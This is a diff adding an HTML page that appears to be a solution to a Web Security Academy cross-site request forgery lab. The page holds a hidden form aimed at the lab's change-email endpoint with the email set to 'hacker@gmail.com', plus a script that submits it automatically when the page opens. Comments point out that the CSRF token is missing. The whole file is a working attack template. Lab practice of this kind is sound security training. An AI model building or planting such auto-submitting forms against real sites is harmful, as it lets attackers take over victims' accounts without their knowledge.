@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <form
+      action="https://0a8700c903b7eff4808580f2009c0028.web-security-academy.net/my-account/change-email"
+      method="POST"
+    >
+      <!-- the only input value -->
+      <input type="text" name="email" value="hacker@gmail.com" />
+      <!-- notice that the csrf token value is not existant -->
+    </form>
+    <script type="text/javascript">
+      // automatically upload form on open
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
